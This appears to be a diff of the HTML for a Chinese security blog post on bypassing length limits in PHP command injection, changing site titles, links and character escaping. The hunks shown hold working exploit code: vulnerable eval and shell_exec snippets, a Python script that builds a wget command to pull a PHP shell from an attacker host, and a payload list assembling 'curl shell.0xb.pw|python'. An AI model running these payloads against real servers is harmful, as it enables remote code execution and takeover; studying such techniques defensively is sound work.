@@ -14,7 +14,7 @@
     
     
     
-    <title>Bypass一些命令注入限制的姿势 | 七友&#39;s Blog | 七友</title>
+    <title>Bypass一些命令注入限制的姿势 | 七友 | 路漫漫其修远兮，吾将上下而求索</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="theme-color" content="#3F51B5">
@@ -26,7 +26,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Bypass一些命令注入限制的姿势">
 <meta property="og:url" content="https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/index.html">
-<meta property="og:site_name" content="七友&#39;s Blog">
+<meta property="og:site_name" content="七友">
 <meta property="og:description" content="文章首发于设置社区https://xz.aliyun.com/t/3918  命令注入OS命令注入(也称为shell注入)是一种web安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来破坏宿主基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。 前置知识说到命令注入，我们不得不提到命令注">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190120174451-083fa032-1c98-1.png">
@@ -122,14 +122,7 @@
             </li>
         
             <li class="waves-block waves-effect">
-              <a href="http://www.weibo.com/ysweb" target="_blank" >
-                <i class="icon icon-lg icon-weibo"></i>
-                Weibo
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/custom"  >
+              <a href="/friends"  >
                 <i class="icon icon-lg icon-link"></i>
                 测试
               </a>
@@ -430,7 +423,7 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
-<span class="token delimiter">?&gt;</span>
+<span class="token delimiter">?></span>
 </code></pre>
 <p>很简单，长度不能大于等于17，直接在eval里面再用一个eval就可以了。<br></p><figure class="image-bubble">
                 <div class="img-lightbox">
@@ -443,7 +436,7 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
-<span class="token delimiter">?&gt;</span>
+<span class="token delimiter">?></span>
 </code></pre>
 <p>这里要用到我们前面所讲到的重定向，<code>n &gt; file</code>：将文件描述符为 n 的文件重定向到 file。<br>既然我们不能一次执行一条完整的命令，我们可以分为多次<br>举个简单的例子</p>
 <figure class="image-bubble">
@@ -455,7 +448,7 @@ m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配
             </figure>
 <p>ls是默认以文件名排序的，所以我们为了控制我们命令的顺序，可以使用ls -t按时间逆序。<br>不过这里考虑到直接写shell有点麻烦（因为php中的一些符号用到shell中是有意义的，要各种转义，为了节省代码量我们直接用curl或者是wget从服务器dump一个shell下来）<br>exp如下：</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-name<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"&gt;php\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;\\ 1.\\\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;\\ -O\\\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;cn\\\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;\\ a.\\\\"</span><span class="token punctuation">,</span><span class="token string">"&gt;wget\\\\"</span><span class="token punctuation">]</span>
+name<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">">php\\"</span><span class="token punctuation">,</span><span class="token string">">\\ 1.\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ -O\\\\"</span><span class="token punctuation">,</span><span class="token string">">cn\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ a.\\\\"</span><span class="token punctuation">,</span><span class="token string">">wget\\\\"</span><span class="token punctuation">]</span>
 <span class="token comment" spellcheck="true">#可以修改hosts文件，让a.cn指向一个自己的服务器。</span>
 <span class="token comment" spellcheck="true">#index.html是一个php的shell</span>
 url<span class="token operator">=</span><span class="token string">"http://192.168.163.128/test.php"</span>
@@ -463,7 +456,7 @@ url<span class="token operator">=</span><span class="token string">"http://192.1
     <span class="token keyword">print</span> x
     param<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span>x<span class="token punctuation">}</span>
     a<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param<span class="token punctuation">)</span>
-param1<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'ls -t&gt;a'</span><span class="token punctuation">}</span>
+param1<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'ls -t>a'</span><span class="token punctuation">}</span>
 param2<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'sh a'</span><span class="token punctuation">}</span>
 requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param1<span class="token punctuation">)</span>
 requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">)</span>
@@ -506,28 +499,28 @@ b<span class="token operator">=</span>requests<span class="token punctuation">.<
 <span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
 <span class="token keyword">from</span> urllib <span class="token keyword">import</span> quote
 payload <span class="token operator">=</span> <span class="token punctuation">[</span>
-   <span class="token comment" spellcheck="true"># generate `ls -t&gt;g` file</span>
-   <span class="token string">'&gt;ls\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'ls&gt;_'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;\ \\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;-t\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;\&gt;g'</span><span class="token punctuation">,</span>
-   <span class="token string">'ls&gt;&gt;_'</span><span class="token punctuation">,</span>
-   <span class="token comment" spellcheck="true"># generate `curl orange.tw.tw&gt;python`</span>
+   <span class="token comment" spellcheck="true"># generate `ls -t>g` file</span>
+   <span class="token string">'>ls\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'ls>_'</span><span class="token punctuation">,</span>
+   <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>-t\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>\>g'</span><span class="token punctuation">,</span>
+   <span class="token string">'ls>>_'</span><span class="token punctuation">,</span>
+   <span class="token comment" spellcheck="true"># generate `curl orange.tw.tw>python`</span>
    <span class="token comment" spellcheck="true"># curl shell.0xb.pw|python</span>
-   <span class="token string">'&gt;on'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;th\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;py\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;\|\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;pw\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;x.\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;xx\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;l.\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;el\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;sh\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;\ \\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;rl\\'</span><span class="token punctuation">,</span>
-   <span class="token string">'&gt;cu\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>on'</span><span class="token punctuation">,</span>
+   <span class="token string">'>th\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>py\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>\|\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>pw\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>x.\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>xx\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>l.\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>el\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>sh\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>rl\\'</span><span class="token punctuation">,</span>
+   <span class="token string">'>cu\\'</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true"># exec</span>
    <span class="token string">'sh _'</span><span class="token punctuation">,</span>
    <span class="token string">'sh g'</span><span class="token punctuation">,</span>
@@ -571,7 +564,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
 
 
         
-        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2019/02/01/Bypass一些命令注入限制的姿势/" target="_blank" rel="external">https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/</a>
+        know it then hack it
         
     </div>
     
@@ -602,7 +595,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
 <div class="page-share" id="pageShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&title=《Bypass一些命令注入限制的姿势》 — 七友's Blog&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&title=《Bypass一些命令注入限制的姿势》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -612,7 +605,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&title=《Bypass一些命令注入限制的姿势》 — 七友's Blog&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&title=《Bypass一些命令注入限制的姿势》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -622,7 +615,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bypass一些命令注入限制的姿势》 — 七友's Blog&url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&via=https://byqiyou.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bypass一些命令注入限制的姿势》 — 七友&url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&via=https://byqiyou.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
@@ -768,7 +761,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
 <div class="global-share" id="globalShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&title=《Bypass一些命令注入限制的姿势》 — 七友's Blog&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&title=《Bypass一些命令注入限制的姿势》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -778,7 +771,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&title=《Bypass一些命令注入限制的姿势》 — 七友's Blog&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&title=《Bypass一些命令注入限制的姿势》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -788,7 +781,7 @@ payload <span class="token operator">=</span> <span class="token punctuation">[<
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bypass一些命令注入限制的姿势》 — 七友's Blog&url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&via=https://byqiyou.github.io" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bypass一些命令注入限制的姿势》 — 七友&url=https://byqiyou.github.io/2019/02/01/Bypass一些命令注入限制的姿势/&via=https://byqiyou.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
